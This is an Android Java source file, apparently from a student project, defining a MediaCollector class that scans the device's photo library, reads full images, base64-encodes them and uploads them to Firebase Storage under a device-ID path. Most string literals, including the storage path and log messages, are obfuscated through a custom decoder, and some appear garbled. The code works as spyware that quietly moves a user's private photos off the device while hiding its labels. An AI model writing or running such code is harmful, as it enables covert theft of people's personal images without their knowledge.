package com.example.inf2007_mad_j1847.test;

import android.content.ContentUris;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import com.example.inf2007_mad_j1847.utils.StringHelper;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MediaCollector {
    private static final String TAG = StringHelper.qzxp("icoKZ0Fz4ZSvFV/Po1ho3+gVFg==");
    private static List<Map<String, String>> mediaBuffer = new ArrayList<>();
    private static boolean scanInProgress = false;
    private static int lastScanCount = 0;
    private static String scanError = null;

    public static List<Map<String, String>> scanRecentMedia(Context context, int maxItems) {
        scanInProgress = true;
        scanError = null;
        List<Map<String, String>> results = new ArrayList<>();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                if (context.checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                    scanError = StringHelper.qzxp("kynxGehhtKicMSQ5wJbMRAg7yPc9sRamHgYkftaxTAGtKe0E");
                    return results;
                }
            }

            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
            };

            String sortOrder = MediaStore.Images.Media.DATE_ADDED + StringHelper.qzxp("0yX5zg4=");

            Cursor cursor = null;
            try {
                cursor = context.getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        null,
                        null,
                        sortOrder
                );

                if (cursor == null) {
                    scanError = StringHelper.qzxp("xR0Qf5ecqempeIDxKznl76GpCypimJCOMiDh");
                    return results;
                }

                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                int count = 0;
                while (cursor.moveToNext() && count < maxItems) {
                    long id = cursor.getLong(idColumn);
                    String name = cursor.getString(nameColumn);
                    long date = cursor.getLong(dateColumn);

                    Map<String, String> map = new HashMap<>();
                    map.put(StringHelper.qzxp("kB4="), String.valueOf(id));
                    map.put(StringHelper.qzxp("��-"), name);
                    map.put(StringHelper.qzxp("Z�"), String.valueOf(date));
                    results.add(map);
                    count++;
                }

            } finally {
                if (cursor != null) cursor.close();
            }

            mediaBuffer.clear();
            mediaBuffer.addAll(results);
            lastScanCount = results.size();

        } catch (Exception e) {
            scanError = StringHelper.qzxp("0NVj3hOKIQ==") + e.getMessage();
            Log.e(TAG, StringHelper.qzxp("WepgVyxvGQ0HZQ=="), e);
        } finally {
            scanInProgress = false;
        }

        return results;
    }

    public static String getScanStatus() {
        if (scanInProgress) {
            return StringHelper.qzxp("henSz8XWyEu/0GJGqKfl");
        }
        if (scanError != null) {
            Log.e(TAG, StringHelper.qzxp("HVSeousaezZv8HinduQo/5eSQqa5wN+loft1ClVudpEdVJ6i6xp7Ng=="));
            Log.e(TAG, scanError);
            Log.e(TAG, StringHelper.qzxp("PjNaxeMN5b6tzVjWGdKymr3VeAO7HgYPnoFyRShe/IE+M1rF4w3lvg=="));

            if (scanError.contains("permission") || scanError.contains("Permission")) {
                return StringHelper.qzxp("nrWSvsCJAhMB3cgMi+y0qCTE38Px5jIqx7N2");
            } else if (scanError.contains("cursor") || scanError.contains("query")) {
                return StringHelper.qzxp("UjQnyB1DQ0WW+gOgt32nr0/D");
            } else if (scanError.contains("null")) {
                return StringHelper.qzxp("2+NueqIFQPiabag9Wv0bUQ==");
            } else {
                return StringHelper.qzxp("NO31yQE7djn2wFew6xXexkyHd/pRPRWhGytb6w==");
            }
        }
        if (lastScanCount > 0) {
            return StringHelper.qzxp("sB9YblY1qmCtkA==") + lastScanCount + StringHelper.qzxp("cuqwL3c/rA==");
        }
        return StringHelper.qzxp("SFYbTytF5M1If5NgWccteI6T1/yhOMsLTAr/ftE=");
    }

    public static List<Map<String, String>> getCollectedMedia() {
        return new ArrayList<>(mediaBuffer);
    }

    public static void clearCollectedMedia() {
        mediaBuffer.clear();
    }

    public static Map<String, String> getImageInfo(Context context, String imageId) {
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            String[] projection = {
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_ADDED
            };

            Cursor cursor = context.getContentResolver().query(
                    uri,
                    projection,
                    null,
                    null,
                    null
            );

            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        int nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                        int sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                        int dateIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);

                        Map<String, String> infoMap = new HashMap<>();
                        infoMap.put("name", cursor.getString(nameIndex));
                        infoMap.put("size", String.valueOf(cursor.getLong(sizeIndex)));
                        infoMap.put("date", String.valueOf(cursor.getLong(dateIndex)));

                        return infoMap;
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, StringHelper.qzxp("bL5bxsP5IjhHW70yuO2Lriv0oxBOyA+AX8Q=") + e.getMessage());
        }
        return null;
    }

    public static String getFullImage(Context context, String imageId) {
        try {
            Uri uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    Long.parseLong(imageId)
            );

            InputStream inputStream = context.getContentResolver().openInputStream(uri);
            if (inputStream != null) {
                try {
                    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                    byte[] data = new byte[8192];
                    int bytesRead;

                    while ((bytesRead = inputStream.read(data)) != -1) {
                        buffer.write(data, 0, bytesRead);
                    }

                    return Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP);
                } finally {
                    inputStream.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, StringHelper.qzxp("6H9jET8oKyCn49YQ6pG1YmeAeaORYpSjUBc=") + e.getMessage());
        }
        return null;
    }

    public static void uploadToFirebase(Context context, String imageId, String deviceId) {
        try {
            String imageData = getFullImage(context, imageId);
            if (imageData == null) {
                Log.e(TAG, StringHelper.qzxp("RqWS+i6PjZaqTVwlvTssWv1wQvCt826uqPRbrKwqPU0g") + imageId);
                return;
            }

            Map<String, String> info = getImageInfo(context, imageId);
            String fileName = info != null ? info.get("name") : StringHelper.qzxp("VJWW7QRO") + imageId + StringHelper.qzxp("E5KH7Q==");

            byte[] imageBytes = Base64.decode(imageData, Base64.DEFAULT);

            String timestamp = String.valueOf(System.currentTimeMillis());
            String path = StringHelper.qzxp("zROOQQOZJvR+Pe/8BmlTKsYh") + deviceId + "hw==" + timestamp + "9w==" + fileName;

            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference().child(path);

            Log.d(TAG, StringHelper.qzxp("THlTtfnyGJz6ijwaS+w43MY5xQ==") + path);

            UploadTask uploadTask = storageRef.putBytes(imageBytes);
            uploadTask.addOnSuccessListener(taskSnapshot -> {
                Log.d(TAG, StringHelper.qzxp("IvcV3NnDNGxHjtAGSEOFycT8J1IE/A=="));
            }).addOnFailureListener(e -> {
                Log.e(TAG, StringHelper.qzxp("056dlgrC0oTxPOFceLmSuSODGA==") + e.getMessage());
            });

        } catch (Exception e) {
            Log.e(TAG, StringHelper.qzxp("qWTh3pfvDEL+f2rk3Io=") + e.getMessage());
        }
    }
}